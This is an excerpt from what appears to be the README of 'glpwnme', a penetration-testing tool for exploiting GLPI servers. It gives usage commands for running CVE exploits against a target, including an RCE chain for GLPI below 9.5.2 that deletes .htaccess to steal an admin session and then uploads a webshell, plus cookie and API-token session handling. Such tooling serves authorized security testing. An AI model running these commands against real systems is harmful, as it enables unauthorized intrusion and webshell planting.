...
| CVE_2026_42320       | 6.5    | Self-Service | GLPI < 11.0.7 |
...
python3 -m glpwnme -t <target> -e <exploit_to_use> -O "option1=value1" "option2=value2" --clean
```

## :page_facing_up: List plugins
```bash
python3 -m glpwnme -t <target> --list-plugins
```
...
```bash
python3 -m glpwnme -t https://test.glpi.com # List all of the available exploits
python3 -m glpwnme -t https://test.glpi.com --check-all # Run all the exploit (if version compatible) on the target that are opsec safe
python3 -m glpwnme -t https://test.glpi.com --check-all --no-opsec # Check all the exploits on the target
```

```bash
# Get the help for the exploit
python3 -m glpwnme -t https://test.glpi.com -e <exploit_to_use> --infos

# Run the exploit_to_use with the options for the run method
python3 -m glpwnme -t https://test.glpi.com -e <exploit_to_use> --run -O "option1=value1" "option2=value2"
...
### RCE on glpi < 9.5.2
```bash
python3 -m glpwnme -t <target> -e CVE_2020_15175 --run # delete .htaccess and recover an admin session
python3 -m glpwnme -t <target> -e PHP_UPLOAD -O file=webshell.php --run --cookie <cookie> --profile SuperAdmin # Login as admin with a cookie recovered before and upload a webshell.php on glpi
...
python3 -m glpwnme -t <target> -u <username> -p <password> --auth <local-1|ldap-1|...> --profile <Super-Admin|Technician|...>

# Login with a cookie value
python3 -m glpwnme -t <target> --cookie <cookie>
...
python3 -m glpwnme -t <target> --token <api_token> --dump-cookies # Will login with the api token and give you the cookie value

# Add custom header and go through burp
python3 -m glpwnme -t <target> -H "X-Forwarded-For: 127.0.0.1" "User-Agent: OrangeCyberdefense/1.1" --proxy http://127.0.0.1:8080

# Use an exploit for check
python3 -m glpwnme -t <target> -e <exploit_name> --check

# Use an exploit for run or clean, with parameter
python3 -m glpwnme -t <target> -e <exploit_name> <--run|--clean> -O 'key=value' 'key2=value'

# Get information about an exploit
python3 -m glpwnme -t <target> -e <exploit_name> --infos
```
